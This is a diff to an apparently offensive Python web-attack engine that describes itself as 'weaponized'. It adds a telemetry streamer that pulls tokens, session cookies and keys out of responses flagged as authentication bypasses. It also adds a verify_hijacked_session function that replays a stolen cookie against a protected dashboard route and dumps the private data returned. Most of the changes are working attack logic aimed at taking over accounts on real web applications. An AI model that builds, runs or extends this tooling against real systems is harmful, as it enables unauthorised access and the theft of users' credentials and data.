@@ -11,7 +11,7 @@ Features:
 - High-concurrency race condition and balance/state logic fuzzing
 - Session-cookie security inspection
 - Bounded concurrency with asyncio
-- Live terminal streaming of successful exploits
+- Live terminal streaming of successful exploits via telemetry module
 - No report files, in-memory findings
 """
 import asyncio
@@ -25,11 +25,12 @@ import time
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
-# Import weaponized offensive modules
+# Import weaponized offensive modules & live telemetry streamer
 from modules.crawler import crawl_target
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
 from modules.race_condition import run_race_condition_test
+from modules.telemetry import stream_proof
 
 # ============================================================
 # CONFIGURATION
@@ -74,22 +75,29 @@ ERROR_PATTERNS = {
 }
 
 # ============================================================
-# OUTPUT
+# OUTPUT COLORS & FORMATTING
 # ============================================================
+CYAN = "\033[96m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+RED = "\033[91m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
+
 def info(message):
-    sys.stdout.write(f"\033[96m[*] {message}\033[0m\n")
+    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
     sys.stdout.flush()
 
 def success(message):
-    sys.stdout.write(f"\033[92m[+] {message}\033[0m\n")
+    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
     sys.stdout.flush()
 
 def warning(message):
-    sys.stdout.write(f"\033[93m[!] {message}\033[0m\n")
+    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
     sys.stdout.flush()
 
 def error(message):
-    sys.stdout.write(f"\033[91m[-] {message}\033[0m\n")
+    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
     sys.stdout.flush()
 
 def section(title):
@@ -171,7 +179,7 @@ def request(host, port, path, payload, secure, cookies=None):
             conn.close()
 
 # ============================================================
-# ADAPTIVE RESPONSE ANALYSIS & MUTATION ENGINE
+# ADAPTIVE RESPONSE ANALYSIS & LIVE TELEMETRY
 # ============================================================
 def detect_database_errors(body):
     findings = []
@@ -194,17 +202,24 @@ def inspect_cookie_security(headers):
         issues.append("SameSite attribute missing")
     return issues
 
-def classify_and_adapt(response, current_payload):
+def classify_and_adapt(response, current_payload, endpoint=""):
     status = response["status"]
     body = response["body"]
     findings = []
     mutated_payloads = []
     
     if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
-        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE AUTHENTICATION BYPASS / CREDENTIAL HIT [***]\033[0m\n")
-        sys.stdout.write(f"  ├── Payload : {json.dumps(current_payload)}\n")
-        sys.stdout.write(f"  └── Response: \033[92m{body[:250]}\033[0m\n")
-        sys.stdout.flush()
+        extracted_proof = {}
+        try:
+            data = json.loads(body)
+            if isinstance(data, dict):
+                extracted_proof = {k: v for k, v in data.items() if any(sub in k.lower() for sub in ["token", "session", "cookie", "auth", "key"])}
+        except:
+            extracted_proof = {"raw_response_snippet": body[:200]}
+
+        # Stream live proof-of-work immediately to the terminal
+        stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})
+
         findings.append({
             "type": "AUTHENTICATION_BYPASS_SUCCESS",
             "evidence": f"Status {status} with valid session/token indicator",
@@ -213,7 +228,7 @@ def classify_and_adapt(response, current_payload):
 
     db_errors = detect_database_errors(body)
     for db_error in db_errors:
-        sys.stdout.write(f"\033[93m[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...\033[0m\n")
+        sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
         sys.stdout.flush()
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
@@ -233,6 +248,21 @@ def classify_and_adapt(response, current_payload):
         })
         
     return findings, mutated_payloads
+
+def verify_hijacked_session(host, port, secure, endpoint, session_cookie):
+    """
+    Takes a stolen cookie or token, hits a restricted administrative endpoint,
+    and streams the resulting private data live to prove the compromise.
+    """
+    sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
+    result = request(host, port, endpoint, {}, secure, cookies=session_cookie)
+    
+    if result["status"] == 200 and len(result["body"]) > 50:
+        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie": session_cookie}, result["body"], {"verified_status": 200})
+        return True
+    else:
+        sys.stdout.write(f"{RED}[-] Session verification returned status {result['status']}. Stolen session inactive.{RESET}\n")
+        return False
 
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
@@ -272,7 +302,7 @@ def test_endpoint(host, port, base_path, path, secure, session_cookie=None, cred
         if result["error"]:
             continue
             
-        findings, dynamic_mutations = classify_and_adapt(result, current_test["payload"])
+        findings, dynamic_mutations = classify_and_adapt(result, current_test["payload"], endpoint=endpoint)
         
         results.append({
             "endpoint": endpoint,
@@ -353,6 +383,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     if session_cookie:
         success(f"Propagating active operator session cookie into exploit modules.")
+        # Optionally test/verify session against a protected dashboard/admin route
+        verify_hijacked_session(host, port, secure, "/dashboard", session_cookie)
+
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
 
@@ -414,4 +447,3 @@ if __name__ == "__main__":
         warning("Engine interrupted by operator.")
     except Exception as exc:
         error(f"Engine failure: {exc}")
-
